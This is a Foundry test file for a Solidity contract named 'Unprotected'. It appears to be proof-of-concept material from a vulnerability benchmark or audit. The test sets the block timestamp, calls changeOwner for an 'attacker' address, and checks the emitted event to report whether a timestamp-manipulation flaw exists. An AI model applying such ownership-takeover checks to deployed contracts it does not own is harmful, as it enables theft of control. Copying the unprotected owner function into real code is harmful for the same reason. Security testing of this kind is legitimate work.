// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/unprotected0.sol";

contract UnprotectedTest is Test {
    Unprotected public unprotected;
    address attacker = address(0xABCD);
    uint256 controlledTimestamp = 1234567890;
    bool vulnerabilityExists = true;

    function setUp() public {
        unprotected = new Unprotected();
    }

    function testTimestampManipulationInChangeOwner() public {
        console2.log("--- BEFORE-Trigger Event Data ---");
        console2.log("Set controlled block timestamp:", controlledTimestamp);
        vm.warp(controlledTimestamp);
        
        console2.log("--- Trigger changeOwner ---");
        vm.recordLogs();
        try unprotected.changeOwner(attacker) {
            console2.log("Function call succeeded");
        } catch {
            console2.log("Function call reverted!");
            vulnerabilityExists = false;
        }
        
        console2.log("--- AFTER-Trigger Event Analysis ---");
        if (vulnerabilityExists) {
            Vm.Log[] memory entries = vm.getRecordedLogs();
            
            if (entries.length != 1) {
                console2.log("Event count mismatch: expected 1, got %d", entries.length);
                vulnerabilityExists = false;
            } else {
                bytes32 expectedEventSig = keccak256("OwnershipChanged(address,address,uint256)");
                bytes32 actualEventSig = entries[0].topics[0];
                
                if (actualEventSig != expectedEventSig) {
                    console2.log("Event signature mismatch");
                    console2.log("Expected event sig:");
                    console2.logBytes32(expectedEventSig);
                    console2.log("Actual event sig:");
                    console2.logBytes32(actualEventSig);
                    vulnerabilityExists = false;
                }

                uint256 emittedTimestamp = abi.decode(entries[0].data, (uint256));
                if (emittedTimestamp != controlledTimestamp) {
                    console2.log("Timestamp mismatch: expected=%d, actual=%d", 
                        controlledTimestamp, emittedTimestamp);
                    vulnerabilityExists = false;
                } else {
                    console2.log("Event timestamp VERIFIED: %d", emittedTimestamp);
                }
            }
        }
        
        // Final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Miner timestamp manipulation persists in event emission");
        } else {
            console2.log("Vulnerability not Exist: Failed to execute exploit");
        }
    }
}